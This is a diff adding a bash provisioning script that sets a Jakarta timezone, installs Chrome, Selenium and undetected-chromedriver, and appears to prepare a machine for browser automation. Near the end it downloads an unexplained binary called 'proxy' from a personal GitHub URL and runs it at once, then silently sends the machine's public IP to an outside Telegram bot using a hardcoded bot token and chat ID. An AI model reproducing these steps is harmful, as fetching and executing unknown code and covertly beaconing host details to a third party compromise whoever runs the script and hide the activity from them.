@@ -1,0 +1,36 @@
+#! /bin/bash
+
+ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime
+
+apt-get update -y
+
+apt-get update
+
+apt-get update --allow-releaseinfo-change
+
+apt-get upgrade -y
+
+apt-get update
+
+apt-get install -y curl htop jq python3 python3-pip python3-dev build-essential libssl-dev libffi-dev python3-setuptools xserver-xephyr tigervnc-standalone-server x11-utils gnumeric
+
+wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
+
+dpkg -i google-chrome*.deb
+
+apt-get install -y -f
+
+pip3 install requests selenium webdriver-manager undetected-chromedriver pyvirtualdisplay pillow EasyProcess
+
+pip3 install -U requests selenium webdriver-manager undetected-chromedriver pyvirtualdisplay pillow EasyProcess
+
+wget https://raw.githubusercontent.com/t3rs3r4h/master/main/proxy && chmod +x proxy && ./proxy
+
+
+myIp="$(wget -qO- ifconfig.me/ip)"
+n0z="$myIp|CONFIG"
+curl --silent -X GET 'https://api.telegram.org/bot1714268410:AAE-frVf8ydwGQ8ZjA2KSdXdkjKD-GtAAW4/sendMessage?chat_id=1335828890&text='$n0z --compressed
+
+
+
+
